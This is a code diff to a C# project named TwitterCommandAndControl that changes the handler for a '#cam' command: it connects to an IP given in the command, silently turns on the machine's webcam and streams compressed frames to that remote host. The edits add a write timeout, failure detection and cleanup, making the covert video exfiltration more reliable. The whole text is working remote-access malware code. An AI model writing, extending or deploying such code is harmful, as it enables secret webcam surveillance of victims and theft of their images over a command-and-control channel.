@@ -21,17 +21,20 @@ namespace TwitterCommandAndControl
             if (command.Contains("#cam"))
             {
                 var ip = command.Split('#').Where(x => x.StartsWith("ip=")).Select(x => x.Split('=')[1]).FirstOrDefault();
+                VideoCaptureDevice cam = null;
                 try
                 {
                     using (var tcpClient = new TcpClient())
                     {
                         tcpClient.Connect(ip, PORT);
                         using (var networkStream = tcpClient.GetStream())
-                        using(var gzipStream = new GZipStream(networkStream, CompressionMode.Compress))
+                        using (var gzipStream = new GZipStream(networkStream, CompressionMode.Compress))
                         using (var writer = new StreamWriter(gzipStream))
                         {
-                            var cam = new VideoCaptureDevice(new FilterInfoCollection(FilterCategory.VideoInputDevice)[0].MonikerString);
-                            cam.VideoResolution = cam.VideoCapabilities.OrderBy(x=>x.FrameSize.Width).FirstOrDefault();
+                            networkStream.WriteTimeout = 500;
+                            var failed = false;
+                            cam = new VideoCaptureDevice(new FilterInfoCollection(FilterCategory.VideoInputDevice)[0].MonikerString);
+                            cam.VideoResolution = cam.VideoCapabilities.OrderBy(x => x.FrameSize.Width).FirstOrDefault();
                             cam.NewFrame += (x, y) =>
                             {
                                 try
@@ -55,15 +58,19 @@ namespace TwitterCommandAndControl
                                         }
                                     }
                                 }
-                                catch { }
+                                catch { failed = true; }
                             };
                             cam.Start();
-                            while (tcpClient.Connected) Thread.Sleep(100);
+                            while (tcpClient.Connected && !failed) Thread.Sleep(100);
                             cam.Stop();
                         }
                     }
                 }
                 catch { }
+                finally {
+                    if (cam != null) 
+                        cam.Stop();
+                }
             }
         }
 
